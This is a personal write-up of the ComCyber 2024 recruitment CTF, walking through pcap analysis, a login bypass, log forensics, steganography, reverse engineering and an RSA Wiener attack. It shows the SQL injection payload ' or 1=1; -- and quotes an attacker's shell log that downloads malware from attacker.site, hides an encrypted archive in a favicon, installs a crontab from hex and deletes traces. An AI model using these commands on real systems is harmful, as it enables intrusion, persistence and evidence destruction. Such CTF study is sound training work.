---
title: "COMCYBER CTF 2024"
date: 2024-10-07 00:00:00 +0800
categories: [CTF]
tags: [CTF]
---

# COMCYBER CTF

On September 2, 2024, the Commandement de la CyberdÃ©fense (ComCyber) organized a CTF to recruit new "cyber sous-officiers." The challenge was rated as easy-medium.

I'll share my experience in this post and explain how I managed to solve it.

If you want to see the official writeup: [Official Writeup](https://blog.root-me.org/posts/writeup_comcyber/)

## First Step: Network Analysis

In the first step of the CTF, you need to download a .pcap file and analyze it using Wireshark.

There is a protocol called TELNET which you can filter in Wireshark. Scrolling through it, you can read the first flag encoded. You can get the first flag by decoding the Base64 encoded string.

If you keep searching in the PCAP and follow the UDP Stream, you can access 163.172.68.42.23:5000.

## Second Step: SQL Injection

The second flag is a login page. You can access it by using the SQL injection technique `' or 1=1; --`.


## Third Step: Forensics

In the dashboard, you can download a log file. Once the file is downloaded, I made a small Python script to extract useful information:

```python
filename = 'debug.txt'

with open(filename, 'r') as fichier:
    lignes = fichier.readlines()
lignes_cmd = [ligne for ligne in lignes if 'CMD' in ligne]
for ligne in lignes_cmd:
    print(ligne.strip())
```



You have multiple result but the importants ones are : 

```
    echo 'efa3fb1f409aa622dddd7220ad6567580fb68b68' > /tmp/.password
    vim message.txt
    wget -O /dev/null https://attacker.site/m4lw3r3
    zip --password ($cat /tmp/.password) secret.zip message.txt m4lw3r3
    cat /app/static/assets/images/favicon.ico ./secret.zip > /app/static/assets/images/favicon.ico
    echo '2a202a202a202a202a20206563686f2027524d7b393835336561303861623734373265653865663237633631363239396461663530653330626439307d270a' | xxd -r -p | crontab -
    crontab -l
    rm -rf ./message.txt ./secret.zip ./m4lw3r3
    rm -rf /tmp/.password
```

You can get the third flag in Hexadecimal into the crontab

## Fourth Step: Binwalk Steganography

Using Binwalk, you can extract files from the favicon.

You will find a zip file inside the Binwalk extraction, which you can extract using the password found in the logs.

Once extracted, you will find another flag in the `message.txt`.

There is also a `m4lw3r3` file.

## Fifth Step: Reverse Engineering

Now, you have a `m4lw3r3` binary file. When you run it, it asks for two inputs: `[input1] [input2]`.

Using Ghidra, you can reverse the file. The first input is split into three strings.

## Sixth Step: RSA Cryptography

This part was the "hardest part" of the CTF. You need to find `input2`. The program uses cryptographic functions for RSA encryption, using the variables `n`, `e`, and `c`.

Once you have these variables, you need to convert them from hexadecimal to decimal. I searched for different vulnerabilities to crack the RSA, using Boneh Durfee or Wiener, but in the end, you can do it with Wiener and RSACTFTOOL.

When you have the string character, you can go back to the dashboard and enable communication. Here, you will find the last flag.

## Conclusion

Overall, the challenge was fun to do, but I wish the login connection was a bit harder and more realistic. I hope they will organize more CTFs like this, and I think it's a good idea to recruit based on CTF!
